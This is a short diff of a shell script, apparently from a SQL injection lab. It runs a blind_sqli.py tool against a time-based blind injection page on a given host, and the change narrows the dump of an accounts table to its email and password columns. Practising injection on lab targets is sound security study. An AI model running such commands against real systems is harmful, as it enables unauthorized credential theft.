@@ -30,5 +30,5 @@ fi
 # last_name:varchar
 # email:varchar
 # password:varchar
-# Recupero i dati
-./blind_sqli.py -u "http://${1}/sqli/time_based_blind.php?email=string" --database=scotchbox --table=accounts --column-list=id,first_name,last_name,email,password
+# Recupero i dati di login
+./blind_sqli.py -u "http://${1}/sqli/time_based_blind.php?email=string" --database=scotchbox --table=accounts --column-list=email,password
